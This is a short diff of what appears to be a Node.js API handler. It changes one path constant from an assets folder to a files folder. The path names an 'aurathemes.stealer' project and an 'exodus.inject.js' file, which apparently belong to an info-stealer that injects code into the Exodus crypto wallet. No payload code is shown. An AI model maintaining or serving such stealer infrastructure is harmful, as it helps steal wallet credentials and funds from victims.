@@ -1,6 +1,6 @@
 import fs from 'fs';
 import path from 'path';
-const injectPath = 'src/assets/scripts/aurathemes.stealer/js/injects/exodus.inject.js';
+const injectPath = 'src/files/scripts/aurathemes.stealer/js/injects/exodus.inject.js';
 export default async function handler(req, res) {
   try {
     if (
